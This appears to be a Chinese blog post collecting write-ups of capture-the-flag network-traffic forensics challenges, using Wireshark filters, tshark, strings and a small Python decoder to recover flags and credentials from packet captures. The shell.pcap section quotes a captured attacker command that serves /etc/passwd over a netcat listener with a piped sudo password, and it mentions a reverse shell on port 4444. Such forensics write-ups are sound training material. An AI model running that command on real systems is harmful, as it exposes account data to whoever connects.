<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">d = open(<span class="string">&quot;/Users/apple/Desktop/tcp.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">l=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">    <span class="keyword">if</span> i!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        print(i)</span><br><span class="line">        l.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    <span class="keyword">if</span> len(i):</span><br><span class="line">        flag+=chr(int(i))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h2 id="TRF09-embarrass"><a href="#TRF09-embarrass" class="headerlink" title="TRF09 embarrass"></a>TRF09 embarrass</h2><p>数据包有点大，简单看了一下有http、ftp，其中ftp下载了一个pcap文件，但是文件太大了打算提取出来但是最终失败了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">227</span> Entering Passive Mode (<span class="number">192</span>,<span class="number">168</span>,<span class="number">197</span>,<span class="number">128</span>,<span class="number">203</span>,<span class="number">208</span>)</span><br><span class="line">SIZE misc2.pcapng</span><br><span class="line"><span class="number">213</span> <span class="number">263619000</span></span><br><span class="line">RETR misc2.pcapng</span><br><span class="line"><span class="number">150</span> Connection accepted</span><br><span class="line"><span class="number">226</span> Transfer OK</span><br></pre></td></tr></table></figure>

<p>最后使用strings命令直接提取flag。</p>
<p>steady@steady:~$ strings /tmp/misc_02.pcapng | grep “flag”<br>GET /flag.php HTTP/1.1<br>GET /flag.doc HTTP/1.1<br>flag{Good_b0y_W3ll_Done}<br>flag{Good_b0y_W3ll_Done}<br>flag{Good_b0y_W3ll_Done}<br>flag{Good_b0y_W3ll_Done}</p>
<h2 id="private"><a href="#private" class="headerlink" title="private"></a>private</h2><p>icmp数据较多。</p>
<p>tshark提取数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r &#x2F;tmp&#x2F;PrivateChannel.pcap.pcapng  -x &quot;icmp and ip.src&#x3D;&#x3D;192.168.50.10&quot; | grep 0010</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0010  00 1c 00 20 00 00 40 01 c7 34 c0 a8 32 0a c0 a8   ... ..@..4..2...</span><br><span class="line">0010  00 1c 00 69 00 00 40 01 c6 eb c0 a8 32 0a c0 a8   ...i..@.....2...</span><br><span class="line">0010  00 1c 00 73 00 00 40 01 c6 e1 c0 a8 32 0a c0 a8   ...s..@.....2...</span><br><span class="line">0010  00 1c 00 20 00 00 40 01 c7 34 c0 a8 32 0a c0 a8   ... ..@..4..2...</span><br><span class="line">0010  00 1c 00 79 00 00 40 01 c6 db c0 a8 32 0a c0 a8   ...y..@.....2...</span><br><span class="line">0010  00 1c 00 6f 00 00 40 01 c6 e5 c0 a8 32 0a c0 a8   ...o..@.....2...</span><br><span class="line">0010  00 1c 00 75 00 00 40 01 c6 df c0 a8 32 0a c0 a8   ...u..@.....2...</span><br><span class="line">0010  00 1c 00 72 00 00 40 01 c6 e2 c0 a8 32 0a c0 a8   ...r..@.....2...</span><br><span class="line">0010  00 1c 00 20 00 00 40 01 c7 34 c0 a8 32 0a c0 a8   ... ..@..4..2...</span><br><span class="line">0010  00 1c 00 66 00 00 40 01 c6 ee c0 a8 32 0a c0 a8   ...f..@.....2...</span><br><span class="line">0010  00 1c 00 6c 00 00 40 01 c6 e8 c0 a8 32 0a c0 a8   ...l..@.....2...</span><br><span class="line">0010  00 1c 00 61 00 00 40 01 c6 f3 c0 a8 32 0a c0 a8   ...a..@.....2...</span><br><span class="line">0010  00 1c 00 67 00 00 40 01 c6 ed c0 a8 32 0a c0 a8   ...g..@.....2...</span><br><span class="line">0010  00 1c 00 20 00 00 40 01 c7 34 c0 a8 32 0a c0 a8   ... ..@..4..2...</span><br><span class="line">0010  00 1c 00 3a 00 00 40 01 c7 1a c0 a8 32 0a c0 a8   ...:..@.....2...</span><br><span class="line">0010  00 1c 00 20 00 00 40 01 c7 34 c0 a8 32 0a c0 a8   ... ..@..4..2...</span><br><span class="line">0010  00 1c 00 53 00 00 40 01 c7 01 c0 a8 32 0a c0 a8   ...S..@.....2...</span><br><span class="line">0010  00 1c 00 33 00 00 40 01 c7 21 c0 a8 32 0a c0 a8   ...3..@..!..2...</span><br><span class="line">0010  00 1c 00 63 00 00 40 01 c6 f1 c0 a8 32 0a c0 a8   ...c..@.....2...</span><br><span class="line">0010  00 1c 00 72 00 00 40 01 c6 e2 c0 a8 32 0a c0 a8   ...r..@.....2...</span><br><span class="line">0010  00 1c 00 33 00 00 40 01 c7 21 c0 a8 32 0a c0 a8   ...3..@..!..2...</span><br><span class="line">0010  00 1c 00 74 00 00 40 01 c6 e0 c0 a8 32 0a c0 a8   ...t..@.....2...</span><br><span class="line">0010  00 1c 00 34 00 00 40 01 c7 20 c0 a8 32 0a c0 a8   ...4..@.. ..2...</span><br><span class="line">0010  00 1c 00 67 00 00 40 01 c6 ed c0 a8 32 0a c0 a8   ...g..@.....2...</span><br><span class="line">0010  00 1c 00 33 00 00 40 01 c7 21 c0 a8 32 0a c0 a8   ...3..@..!..2...</span><br><span class="line">0010  00 1c 00 6e 00 00 40 01 c6 e6 c0 a8 32 0a c0 a8   ...n..@.....2...</span><br><span class="line">0010  00 1c 00 74 00 00 40 01 c6 e0 c0 a8 32 0a c0 a8   ...t..@.....2...</span><br></pre></td></tr></table></figure>

<h2 id="first-contact"><a href="#first-contact" class="headerlink" title="first-contact"></a>first-contact</h2><p>机器人正在与坠毁的船舶通信。您的目标是通过检查网络流量来查找船舶的位置。题目是first所以尝试追踪第一个tcp流。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp.stream eq 0</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ROBOT BOOTUP INITIALIZING</span><br><span class="line">SPACE SHIP READY</span><br><span class="line">BOOTUP BEGIN</span><br><span class="line">FIRMWARE STATUS.... COMPLETE</span><br><span class="line">LOCATION STATUS.... ERROR</span><br><span class="line">****BOOT ERROR****</span><br><span class="line">COULD NOT READ FROM DISK ID 0xEF982DA0</span><br><span class="line">INITIALIZE RECOVERY PROCEDURE 0xCD950422</span><br><span class="line">PROCEDURE 0xCD950422 STATUS.... COMPLETE</span><br><span class="line">AWAITING NEW LOCATION STATUS</span><br><span class="line">NEW LOCATION STATUS: 302</span><br><span class="line">NEW LOCATION COORDINATES: 37 14&#39;06&quot;N 115 48&#39;40&quot;W</span><br><span class="line">NEW LOCATION INFO: LOCKED</span><br><span class="line">NEW LOCATION UPDATE COMPLETE</span><br><span class="line">NEW LOCATION UPDATE SUCCESS</span><br></pre></td></tr></table></figure>

<h2 id="voip"><a href="#voip" class="headerlink" title="voip"></a>voip</h2><p>电话-&gt;VoIP通话，可以直接听到通话内容。</p>
<p>VoIP提取语音。</p>
<h2 id="digital-camouflage"><a href="#digital-camouflage" class="headerlink" title="digital-camouflage"></a>digital-camouflage</h2><p>获取数据包中用户登录的密码。</p>
<p>http.request.method eq POST 过滤出post请求</p>
<p>查看form表单的数据。</p>
<p>或者直接搜索字符串user、passwd等常见字段。</p>
<h2 id="No-Big-Deal"><a href="#No-Big-Deal" class="headerlink" title="No_Big_Deal"></a>No_Big_Deal</h2><p>分析一下协议，有ftp协议，追踪流，看到存储了一个key文件，后缀保存为ssc。并且打开之后发现有许多TLSv1.2的数据。有些数据已经进行加密，其中某一个ip进行了http请求内容已经加密。</p>
<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019104532504.png" alt="image-20201019104532504"></p>
<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019104340990.png" alt="image-20201019104340990"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">STOR ssc.key</span><br><span class="line">150 Connecting to port 43935</span><br><span class="line">226-File successfully transferred</span><br><span class="line">226 0.001 seconds (measured here), 4.59 Mbytes per second</span><br><span class="line">QUIT</span><br><span class="line">221-Goodbye. You uploaded 4 and downloaded 0 kbytes.</span><br><span class="line">221 Logout.</span><br></pre></td></tr></table></figure>

<p>接着提取出来。协议分级可以看到还有smpt流量，但是找不到该流量，联系ftp找到的密钥才想可能被加密过。</p>
<p>进行解密，新版本wireshark没有ssl，直接搜索TLS</p>
<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019103048789.png" alt="image-20201019103048789"></p>
<p>过滤流量，在解密流量中拿到flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr &#x3D;&#x3D; 52.214.142.175 and http</span><br></pre></td></tr></table></figure>

<h2 id="SSL-Sniff"><a href="#SSL-Sniff" class="headerlink" title="SSL Sniff"></a>SSL Sniff</h2><p>过滤ssl协议，密钥隐藏在证书的stateOrProvinceName字段中。</p>
<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p><code>http.host contains tribalwars</code>过滤出tribalwars网站的数据包</p>
<p>找到post的数据请求得到账户和密码</p>
<h2 id="DFA-CCSC-Spring-2020-CTF"><a href="#DFA-CCSC-Spring-2020-CTF" class="headerlink" title="DFA/CCSC Spring 2020 CTF"></a>DFA/CCSC Spring 2020 CTF</h2><h3 id="shell-pcap"><a href="#shell-pcap" class="headerlink" title="shell.pcap"></a>shell.pcap</h3><p>安装ncat，然后开放9999端口并将/etc/passwd输送到999端口。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jtomato@ns01:~$ echo &quot;*umR@Q%4V&amp;RC&quot; | sudo -S nc -nvlp 9999 &lt; &#x2F;etc&#x2F;passwd</span><br><span class="line">echo &quot;*umR@Q%4V&amp;RC&quot; | sudo -S nc -nvlp 9999 &lt; &#x2F;etc&#x2F;passwd</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 9999)</span><br><span class="line">Connection from 192.168.2.244 34972 received!</span><br><span class="line">jtomato@ns01:~$ exit</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9999&#125;</span><br></pre></td></tr></table></figure>

<p>反向外壳监听哪个端口？</p>
<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/1BC315BA-1A9B-4B6A-889E-2E762B203327.png" alt="1BC315BA-1A9B-4B6A-889E-2E762B203327"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4444&#125;</span><br></pre></td></tr></table></figure>

<p>什么文件添加到第二个外壳？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;&#x2F;etc&#x2F;passwd&#125;</span><br></pre></td></tr></table></figure>

<h3 id="smb-pcapng"><a href="#smb-pcapng" class="headerlink" title="smb.pcapng"></a>smb.pcapng</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the tree that is being browsed?</span><br></pre></td></tr></table></figure>

<p>使用操作码过滤，最终被浏览的共享为\public</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smb2.cmd &#x3D;&#x3D; 3</span><br></pre></td></tr></table></figure>

<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019145112551.png" alt="image-20201019145112551"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the path of the file that is opened?</span><br></pre></td></tr></table></figure>

<p>使用操作码过滤，找到打开的文件路径</p>
<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/5231ACC5-8931-48C2-A483-06100814B4CE.png" alt="5231ACC5-8931-48C2-A483-06100814B4CE"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the hex status code when the user SAMBA\jtomato logs in?</span><br></pre></td></tr></table></figure>

<p>使用操作码过滤，用户登录失败</p>
<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019145829154.png" alt="image-20201019145829154"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">There is a nice simple flag in the file that was accessed.</span><br></pre></td></tr></table></figure>

<p>SMB访问了一个文件，我们需要把它提取出来，wireshark可以直接提取文件。</p>
<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/047CA09E-4574-4E0A-8ED2-D96779F99817.png" alt="047CA09E-4574-4E0A-8ED2-D96779F99817"></p>
<p>直接搜索flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&lt;OneSuperDuperSecret&gt;</span><br></pre></td></tr></table></figure>

<p>SMB2操作码列表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">SMB2 commands listed by opcode value. Every Command PDU starts with a SMB2&#x2F;BufferCode.</span><br><span class="line"></span><br><span class="line">0x00 SMB2&#x2F;NegotiateProtocol</span><br><span class="line"></span><br><span class="line">0x01 SMB2&#x2F;SessionSetup</span><br><span class="line"></span><br><span class="line">0x02 SMB2&#x2F;SessionLogoff</span><br><span class="line"></span><br><span class="line">0x03 SMB2&#x2F;TreeConnect</span><br><span class="line"></span><br><span class="line">0x04 SMB2&#x2F;TreeDisconnect</span><br><span class="line"></span><br><span class="line">0x05 SMB2&#x2F;Create</span><br><span class="line"></span><br><span class="line">0x06 SMB2&#x2F;Close</span><br><span class="line"></span><br><span class="line">0x07 SMB2&#x2F;Flush</span><br><span class="line"></span><br><span class="line">0x08 SMB2&#x2F;Read</span><br><span class="line"></span><br><span class="line">0x09 SMB2&#x2F;Write</span><br><span class="line"></span><br><span class="line">0x0a SMB2&#x2F;Lock</span><br><span class="line"></span><br><span class="line">0x0b SMB2&#x2F;Ioctl</span><br><span class="line"></span><br><span class="line">0x0c SMB2&#x2F;Cancel</span><br><span class="line"></span><br><span class="line">0x0d SMB2&#x2F;KeepAlive</span><br><span class="line"></span><br><span class="line">0x0e SMB2&#x2F;Find</span><br><span class="line"></span><br><span class="line">0x0f SMB2&#x2F;Notify</span><br><span class="line"></span><br><span class="line">0x10 SMB2&#x2F;GetInfo</span><br><span class="line"></span><br><span class="line">0x11 SMB2&#x2F;SetInfo</span><br><span class="line"></span><br><span class="line">0x12 SMB2&#x2F;Break</span><br></pre></td></tr></table></figure>


      
    </div>
    <div class="article-footer">
      <blockquote class="mt-2x">
  <ul class="post-copyright list-unstyled">
    
    <li class="post-copyright-link hidden-xs">
      <strong>本文链接：</strong>
      <a href="http://s1eady.top/2019/04/08/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%981/" title="CTF-流量分析题1" target="_blank" rel="external">http://s1eady.top/2019/04/08/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%981/</a>
    </li>
    
    <li class="post-copyright-license">
      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
    </li>
  </ul>
</blockquote>


<div class="panel panel-default panel-badger">
  <div class="panel-body">
    <figure class="media">
      <div class="media-left">
        <a href="https://github.com/cofess" target="_blank" class="img-burn thumb-sm visible-lg">
          <img src="/images/steady.jpg" class="img-rounded w-full" alt="">
        </a>
      </div>
      <div class="media-body">
        <h3 class="media-heading"><a href="https://github.com/cofess" target="_blank"><span class="text-dark">果冻</span><small class="ml-1x">Penetration Testing</small></a></h3>
        <div>一往情深深几许。</div>
      </div>
    </figure>
  </div>
</div>


    </div>
  </article>
  
    
  <section id="comments">
  	
      <div id="vcomments"></div>
    
  </section>


  
</div>

  <nav class="bar bar-footer clearfix" data-stick-bottom>
  <div class="bar-inner">
  
  <ul class="pager pull-left">
    
    <li class="prev">
      <a href="/2019/04/09/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90--tshark%E7%9A%84%E4%BD%BF%E7%94%A8/" title="tshark的使用"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
    </li>
    
    
    <li class="next">
      <a href="/2019/02/05/session%E3%80%81cookie%E5%8E%9F%E7%90%86/" title="session、cookie原理"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
    </li>
    
    
    <li class="toggle-toc">
      <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button">
        <span>[&nbsp;</span><span>文章目录</span>
        <i class="text-collapsed icon icon-anchor"></i>
        <i class="text-in icon icon-close"></i>
        <span>]</span>
      </a>
    </li>
    
  </ul>
  
  
  <!-- Button trigger modal -->
  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
  </div> -->
  
  
  <div class="bar-right">
    
    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
    
  </div>
  </div>
</nav>
  
<!-- Modal -->
<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
  <div class="modal-dialog" role="document">
    <div class="modal-content donate">
      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
      <div class="modal-body">
        <div class="donate-box">
          <div class="donate-head">
            <p>感谢您的支持，我会继续努力的!</p>
          </div>
          <div class="tab-content">
            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
              <div class="donate-payimg">
                <img src="/images/donate/2.png" alt="扫码支持" title="扫一扫" />
              </div>
              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
            </div>
            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
              <div class="donate-payimg">
                <img src="/images/donate/1.png" alt="扫码支持" title="扫一扫" />
              </div>
              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
            </div>
          </div>
          <div class="donate-footer">
            <ul class="nav nav-tabs nav-justified" role="tablist">
              <li role="presentation" class="active">
                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
              </li>
              <li role="presentation" class="">
                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>



</main>

  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
	
	
    <ul class="social-links">
    	
        <li><a href="/GXA111666" target="_blank" title="VX" data-toggle=tooltip data-placement=top><i class="icon icon-VX"></i></a></li>
        
        <li><a href="/1252195810" target="_blank" title="QQ" data-toggle=tooltip data-placement=top><i class="icon icon-QQ"></i></a></li>
        
        <li><a href="/1252195810@qq.com" target="_blank" title="E-Mail" data-toggle=tooltip data-placement=top><i class="icon icon-E-mail"></i></a></li>
        
        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
        
    </ul>

    <div class="copyright">
    	
        <div class="publishby">
        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
        </div>
    </div>
</footer>
  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
<script>
window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
</script>

<script src="/js/plugin.min.js"></script>


<script src="/js/application.js"></script>


    <script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            PAGES: '页面',
            CATEGORIES: '分类',
            TAGS: '标签',
            UNTITLED: '(未命名)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>

<script src="/js/insight.js"></script>






   




   
    
  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/valine"></script>
  <script type="text/javascript">
  var GUEST = ['nick', 'mail', 'link'];
  var meta = 'nick,mail,link';
  meta = meta.split(',').filter(function(item) {
    return GUEST.indexOf(item) > -1;
  });
  new Valine({
    el: '#vcomments',
    verify: false,
    notify: false,
    appId: '',
    appKey: '',
    placeholder: 'Just go go',
    avatar: 'mm',
    meta: meta,
    pageSize: '10' || 10,
    visitor: false
  });
  </script>

     







</body>
</html>